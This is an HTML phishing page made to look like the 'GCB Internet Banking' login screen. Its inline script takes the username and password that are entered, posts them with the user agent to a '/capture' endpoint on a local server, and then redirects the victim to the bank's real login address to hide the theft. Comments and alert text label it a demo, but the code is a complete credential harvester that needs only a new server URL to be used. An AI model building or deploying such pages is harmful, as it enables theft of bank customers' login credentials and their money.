<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>GCB Internet Banking Login</title>
  <link rel="stylesheet" href="style.css" />
</head>
<body>
  <header class="navbar">
    <div class="menu-icon">
      <div class="bar"></div>
      <div class="bar"></div>
      <div class="bar"></div>
    </div>
  </header>

  <main class="container">
    <section class="login-section">
      <form class="login-form" id="form">
        <label for="username">Username</label>
        <input type="text" name="username" required />

        <label for="password">Password</label>
        <input type="password" name="password" required />
        
        <button type="submit">Login</button>
      </form>
    </section>
  </main>
  <script>
    const form = document.getElementById('form');
    if (form) {
      form.addEventListener('submit', async (event) => {
        event.preventDefault(); // Prevent default form submission

        // Collect form data
        const formData = new FormData(form);
        const username = formData.get('username');
        const password = formData.get('password');

        // Send data to Node.js server
        try {
          const response = await fetch('http://localhost:3000/capture', { // Update with your server URL
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              username,
              password,
              ip: 'demo-ip', // You can get the real IP via a service if needed
              userAgent: navigator.userAgent,
            }),
          });

          if (response.ok) {
            const result = await response.json();
            alert('Demo: Credentials captured! In real phishing, this would steal your info.');
            window.location.href = 'https://www.ebank.gcbbankltd.com/?page=login-form'; // Redirect to real site
          } else {
            alert('Error submitting credentials. Check server.');
          }
        } catch (error) {
          console.error('Error:', error);
          alert('Network errorâ€”check console for details.');
        }
      });
    }
  </script>
</body>
</html>
